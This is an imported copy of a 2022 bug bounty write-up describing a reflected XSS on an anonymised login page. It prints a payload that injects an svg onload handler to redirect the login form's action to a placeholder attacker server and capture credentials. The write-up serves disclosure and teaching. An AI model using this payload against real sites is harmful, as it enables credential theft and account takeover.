---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-08-01_how-i-get-full-account-takeover-via-stealing-actions-login-form-xss.md
original_filename: 2022-08-01_how-i-get-full-account-takeover-via-stealing-actions-login-form-xss.md
title: How I get Full Account Takeover via stealing action’s login form | XSS
category: documents
detected_topics:
- xss
- command-injection
- api-security
tags:
- imported
- documents
- xss
- command-injection
- api-security
language: en
raw_sha256: d7a8c1731edf9cff42c67d738c63047bf2fef6657b20c1a6b4cdc358b45221c5
text_sha256: 662a668ed92438cb8a462a4d1134c9e53661af1768ff7c49de4335e2c805cf7d
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: false
---

# How I get Full Account Takeover via stealing action’s login form | XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-08-01_how-i-get-full-account-takeover-via-stealing-actions-login-form-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection, api-security
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: False
- Raw SHA256: `d7a8c1731edf9cff42c67d738c63047bf2fef6657b20c1a6b4cdc358b45221c5`
- Text SHA256: `662a668ed92438cb8a462a4d1134c9e53661af1768ff7c49de4335e2c805cf7d`


## Content

---
title: "How I get Full Account Takeover via stealing action’s login form | XSS"
url: "https://medium.com/@mohamedtarekq/how-i-get-full-account-takeover-via-stealing-actions-login-form-xss-9e50068c2b2d"
authors: ["Mohamed Tarek (@timooon107)"]
bugs: ["XSS", "Account takeover"]
publication_date: "2022-08-01"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2377
scraped_via: "browseros"
---

# How I get Full Account Takeover via stealing action’s login form | XSS

Mohamed Tarek
 highlighted

How I get Full Account Takeover via stealing action’s login form | XSS
Mohamed Tarek
Follow
2 min read
·
Aug 2, 2022

127

3

Today I will explain How I get Full Account Takeover via stealing the action of the login form when you have XSS on the login page.

💡 Note: This was a private program, so I will refer to it with example.com.

How I found The XSS?

When I do my recon I usually check the web-archive URLs of my target.

I found this URL https://www.example.com/account/?jid=77877

The jid parameter has no validation on it so when I add a simple XSS payload The alert was fired.

Press enter or click to view image in full size

But sadly, the Brief of the program says

For XSS issues we request you to provide a POC that demonstrates that you can actually steal a session cookie or any other sensitive information. Just showing a cookie in a pop-up will not be considered valid either, instead, we request you to demonstrate that the session cookie can be sent outside the same-origin policy restrictions. XSS issues that do not demonstrate this will not be considered valid issues.

Time to escalate it to Account Take Over

💡 I asked myself you are in the Login page and you have XSS you can control everything in this page via javascript, so what if you change the action of the login form to send the username and password to your server?

Get Mohamed Tarek’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

so simple javascript code like this will change the action of this form

document.forms[1].action='https://<YOUR_SERVER>/?Hacked'

The Final payload

https://www.example.com/account/?jid=77877"><svg onload=document.forms[1].action='https://<YOUR_SERVER>/?Hacked'>

I used Burb Collaborator As my server and when I checked it I found my username and password.

Press enter or click to view image in full size

But under the hood, the bugcrowd team triage it as P3 severity and refused to raise the severity of this vulnerability

Press enter or click to view image in full size

I hope you enjoyed reading and I will be very happy If you have any feedback
